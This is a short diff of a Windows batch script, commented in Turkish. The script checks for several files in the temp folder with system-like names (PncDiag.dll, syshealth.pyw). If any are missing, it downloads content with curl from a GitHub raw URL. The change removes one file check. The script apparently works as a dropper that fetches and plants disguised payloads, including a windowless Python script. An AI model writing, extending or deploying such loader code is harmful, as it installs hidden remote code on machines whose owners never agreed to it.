@@ -12,7 +12,7 @@ set "FILE6=%temp%\PncDiag.dll"
 set "FILE7=%temp%\syshealth.pyw"
 
 :: Tüm dosyaların varlığını tek tek kontrol et
-if exist "%FILE1%" if exist "%FILE2%" if exist "%FILE3%" if exist "%FILE4%"  if exist "%FILE5%"  if exist "%FILE6%" if exist "%FILE7%" (
+if exist "%FILE1%" if exist "%FILE2%"  if exist "%FILE4%"  if exist "%FILE5%"  if exist "%FILE6%" if exist "%FILE7%" (
     exit
 )
 
@@ -26,4 +26,5 @@ curl -L "https://raw.githubusercontent.com/seition2doc/dosta2/refs/heads/main/sy
 
 
 exit
+
 
